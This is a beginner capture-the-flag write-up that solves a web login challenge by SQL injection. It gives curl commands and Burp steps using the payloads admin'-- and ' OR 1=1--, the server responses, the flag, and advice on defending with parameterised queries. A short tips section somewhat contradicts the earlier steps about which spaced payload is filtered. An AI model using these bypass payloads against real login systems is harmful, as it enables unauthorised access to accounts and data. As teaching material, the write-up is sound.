# Safaricom CTF — Know Your Limits (Web, 200 pts)

> **Assumption:** the CHALLENGE CONTEXT block in the brief was blank, so I assumed
> the event is **Safaricom CTF (SAFCTF)**, category **Web**, difficulty **200 pts**,
> and the target is `http://54.72.82.22:8060`. All commands and outputs below were
> captured live against that service.

## 1. Challenge Overview

"Know Your Limits" is a beginner web challenge (200 pts) that greets you with a
login form. The goal is to log in as the `admin` user and read the flag that the
admin account is holding. Categories like this are almost always about trusting
user input inside a database query.

## 2. What You Need Before Starting

- **curl** — `sudo apt install curl` (Kali already has it).
- A normal browser, optional, to look at the page.
- No account, no VPN. The service listens on a raw IP/port.
- **Time estimate:** 15–30 minutes for a beginner.

## 3. Reconnaissance

1. Open the page in a browser, or fetch it with curl:

```bash
curl -s http://54.72.82.22:8060/
```

Expected output (trimmed):

```html
<h1>Know Your Limits</h1>
<form method="post">
  <input name="username" ...>
  <input name="password" type="password" ...>
  <button>Login</button>
</form>
```

**Why this matters:** the form posts two fields, `username` and `password`. That
tells you exactly what to send with curl next.

2. Send a deliberately wrong login to see how the app reacts:

```bash
curl -s -X POST --data-urlencode "username=admin" --data-urlencode "password=nope" \
  http://54.72.82.22:8060/
```

Expected output:

```html
Login failed!
```

**Why this matters:** the app reports success/failure in the response body. That
means we can automate and compare responses easily.

[SCREENSHOT: the login page, and the "Login failed!" response]

## 4. Identifying the Vulnerability

The vulnerability is **SQL Injection (SQLi)**. SQL injection happens when a
program builds a database query by gluing (concatenating) user input directly
into the query string instead of using parameterised queries ("prepared
statements"). If the username is pasted straight into something like

```sql
SELECT * FROM users WHERE username = '<input>' AND password = '<input>'
```

then typed characters like a single quote `'` can change the meaning of the
query. The sign that tipped me off: a login form that returns plain text
success/failure and gives no other feedback. The first thing to test is always
`'` and the comment syntax `--`.

**Analogy:** the app is like a form where you write your name, and a clerk reads
it out loud to a database. If you write `admin'--`, the clerk reads "look up
`admin`, and ignore the rest of this sentence." The password check is the "rest
of the sentence."

## 5. Exploitation Step by Step

1. **Start with a login that skips the password.** We try `admin'--`, which makes
   the query look up `admin` and then comments out everything after it
   (including the password check).

```bash
curl -s -X POST --data-urlencode "username=admin'--" --data-urlencode "password=x" \
  http://54.72.82.22:8060/
```

Expected output:

```html
Welcome back user admin, safctf{30f33ad5be8abc02f034b5b266ff6b81}
```

**What to look for:** the word `Welcome` plus the flag right in the response.
That is our flag.

2. **Confirm what happened (optional, for learning).** Turn the whole `WHERE`
   clause true with `' OR 1=1--` and you log in as the *first* user, which is a
   non-admin called `test`:

```bash
curl -s -X POST --data-urlencode "username=' OR 1=1--" --data-urlencode "password=x" \
  http://54.72.82.22:8060/
```

Expected output:

```html
Welcome back user test, Flag at admin user
```

**What to look for:** `Flag at admin user` proves the flag lives on the admin
row, and that we can choose which user we log in as.

[SCREENSHOT: Burp Repeater showing `username=admin'--` and the flag response]

### Optional Burp Suite walkthrough

1. Open Burp, make sure **Proxy → Intercept is on**, and submit the form in the browser.
2. Right-click the intercepted `POST /` request → **Send to Repeater**.
3. In Repeater, edit the body to `username=admin'--&password=x` and click **Send**.
4. Read the response pane — the flag is in the HTML.

## 6. Capturing the Flag

The flag appears directly in the HTTP response body after the successful login:

```
safctf{30f33ad5be8abc02f034b5b266ff6b81}
```

Copy it from the browser or from the curl output.

## 7. Why This Works (Beginner Explanation)

The server treats your username as *data*, but the database treats it as *code*.
`admin'--` closes the string the developer opened and starts a comment, so the
password condition disappears from the query entirely. With `' OR 1=1--` the
condition becomes "true for every row", and the app returns the first row.

This matters outside CTFs because SQL injection has caused some of the largest
data breaches in history — attackers have dumped entire user databases, and in
extreme cases run operating-system commands through the database server. The fix
is boring and effective: never build queries with string concatenation.

## 8. Common Mistakes and Dead Ends

- **Using `--` with a trailing space the wrong way.** In the URL you must encode
  it, so curl sees `admin'--`. If you forget `--data-urlencode`, curl mangles the
  quote.
- **Trying `admin' OR 1=1--` first** (with spaces). This particular box filters
  some payloads, and a spaced version returns a 403. The no-space form works.
- **Assuming you need the real admin password.** You do not — that is the whole
  point of the injection.
- **Forgetting the `-s` flag on curl**, which buries the answer under progress
  output.

## 9. How to Defend Against This

- Use **parameterised queries / prepared statements** so user input can never
  change the query's structure.
- Never concatenate user input into SQL, and never rely on escaping alone.
- Apply **least privilege** to the database account the app uses (no `DROP`,
  no file reads) so a mistake is contained.
- Return generic login errors so attackers cannot tell *why* a login failed.
- Add server-side logging/alerting for unusual characters in login fields.

## 10. Key Takeaways

- A login form that answers in plain text is a strong SQLi candidate.
- Test payloads: `'`, `admin'--`, `' OR 1=1--`.
- `--` starts a SQL comment; it "deletes" the rest of the query.
- Save to your cheatsheet:
  `curl -s -X POST --data-urlencode "username=admin'--" --data-urlencode "password=x" http://TARGET/`
- **Flag:** `safctf{30f33ad5be8abc02f034b5b266ff6b81}`

Nice work — you just exploited your first SQL injection. That skill shows up in
almost every CTF you will ever play.
